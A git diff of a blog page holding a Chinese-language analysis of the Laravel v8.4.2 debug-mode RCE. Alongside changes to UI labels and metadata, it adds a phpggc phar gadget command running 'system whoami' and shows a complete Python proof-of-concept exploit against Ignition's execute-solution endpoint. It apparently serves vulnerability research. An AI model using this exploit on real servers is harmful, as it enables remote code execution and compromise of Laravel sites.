@@ -26,9 +26,10 @@
 <meta property="og:image" content="http://yoursite.com/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123163337310.png">
 <meta property="og:image" content="http://yoursite.com/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123164709947.png">
 <meta property="og:image" content="http://yoursite.com/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123164631757.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210209175439934.png">
 <meta property="og:image" content="http://yoursite.com/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123152707425.png">
 <meta property="article:published_time" content="2021-01-18T07:00:11.000Z">
-<meta property="article:modified_time" content="2021-01-23T08:51:51.356Z">
+<meta property="article:modified_time" content="2021-02-09T09:55:45.709Z">
 <meta property="article:author" content="P2hm1n">
 <meta property="article:tag" content="漏洞分析">
 <meta name="twitter:card" content="summary">
@@ -108,13 +109,13 @@
         
         <div class="navbar-menu navbar-end">
             
-            <a class="navbar-item search" title="Suche" href="javascript:;">
+            <a class="navbar-item search" title="Search" href="javascript:;">
                 <i class="fas fa-search"></i>
             </a>
             
             
             <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
-                <a class="navbar-item" title="Inhaltsverzeichnis">
+                <a class="navbar-item" title="Table of Contents">
                     <i class="fa fa-list"></i>
                 </a>
                 <div class="navbar-dropdown is-right">
@@ -197,7 +198,7 @@
         <span class="column is-narrow">
             
             
-            8 分钟 lesen (Über 1234 Wörter)
+            8 分钟 read (About 1272 words)
         </span>
         
     </div>
@@ -241,7 +242,7 @@
 </ol>
 <p>&#x4E24;&#x79CD;&#x601D;&#x8DEF;&#x90FD;&#x662F;&#x6253;&#x7684; laravel &#x7684;&#x4F9D;&#x8D56;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x94FE;</p>
 <h3 id="&#x76F4;&#x63A5;&#x89E6;&#x53D1;"><a href="#&#x76F4;&#x63A5;&#x89E6;&#x53D1;" class="headerlink" title="&#x76F4;&#x63A5;&#x89E6;&#x53D1;"></a>&#x76F4;&#x63A5;&#x89E6;&#x53D1;</h3><p>&#x5982;&#x679C;&#x80FD;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A; phar&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x89E6;&#x53D1;</p>
-<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o ./monolog1.gif</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">./phpggc monolog/rce1 system whoami --phar phar -o ./monolog1.gif</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210122231342884.png" alt="image-20210122231342884"></p>
 <h3 id="&#x8F6C;&#x6362;&#x89E6;&#x53D1;"><a href="#&#x8F6C;&#x6362;&#x89E6;&#x53D1;" class="headerlink" title="&#x8F6C;&#x6362;&#x89E6;&#x53D1;"></a>&#x8F6C;&#x6362;&#x89E6;&#x53D1;</h3><blockquote>
 <p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5305;&#x542B;&#x6BCF;&#x4E2A;PHP&#x9519;&#x8BEF;&#x548C;&#x5806;&#x6808;&#x8DDF;&#x8E2A;&#x7684;Laravel&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x5728;&#x4E2D;<code>storage/log/laravel.log</code></p>
@@ -270,6 +271,8 @@
 <p>final POC</p>
 <p><a href="https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py" target="_blank" rel="noopener">https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py</a></p>
 <p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&quot;http://laravel:80/index.php/_ignition/execute-solution&quot;</span></span><br><span class="line">headers = {</span><br><span class="line">    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>}</span><br><span class="line">vul_json = {</span><br><span class="line">    <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;parameters&quot;</span>: {</span><br><span class="line">        <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span></span><br><span class="line">        }}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clearLog</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> url, headers, vul_json</span><br><span class="line">    vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        res1 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> res1 <span class="hljs-keyword">and</span> res1.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">            res2 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> res2 <span class="hljs-keyword">and</span> res2.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                print(<span class="hljs-string">&quot;clear&quot;</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getphar</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> url, headers, vul_json</span><br><span class="line">    <span class="hljs-comment"># while True:</span></span><br><span class="line">    clearLog()</span><br><span class="line">    vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;AA&quot;</span></span><br><span class="line">    res1 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;file_get_contents(AA)&apos;</span> <span class="hljs-keyword">in</span> res1.text:</span><br><span class="line">        vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00&quot;</span></span><br><span class="line">        res2 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;file_get_contents(&apos;</span> <span class="hljs-keyword">in</span> res2.text:</span><br><span class="line">            vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line">            res3 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> res3 <span class="hljs-keyword">and</span> res3.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                print(<span class="hljs-string">&quot;phar write&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">    getphar()</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x540E;&#x6765;&#x8DDF; @lihuaiqiu &#x548C; @decade &#x4EA4;&#x6D41; MAMP &#x73AF;&#x5883;&#x5931;&#x8D25;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x53D1;&#x73B0;&#x662F; MAMP &#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x6269;&#x5C55;</p>
+<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210209175439934.png" alt="image-20210209175439934"></p>
 <h3 id="Talking-to-PHP-FPM-using-FTP"><a href="#Talking-to-PHP-FPM-using-FTP" class="headerlink" title="Talking to PHP-FPM using FTP"></a>Talking to PHP-FPM using FTP</h3><p>&#x601D;&#x8DEF;&#x5F88;&#x4E0D;&#x9519;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x8FD9;&#x4E24;&#x7BC7;&#x6587;&#x7AE0;</p>
 <ul>
 <li><a href="https://www.anquanke.com/post/id/226750#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/226750#h2-0</a></li>
@@ -489,7 +492,7 @@
     <div class="searchbox-mask"></div>
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -502,10 +505,10 @@
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Seiten',
-                CATEGORIES: 'Kategorien',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
                 TAGS: 'Tags',
-                UNTITLED: '(Sans Titre)',
+                UNTITLED: '(Untitled)',
             },
             CONTENT_URL: '/content.json',
         };
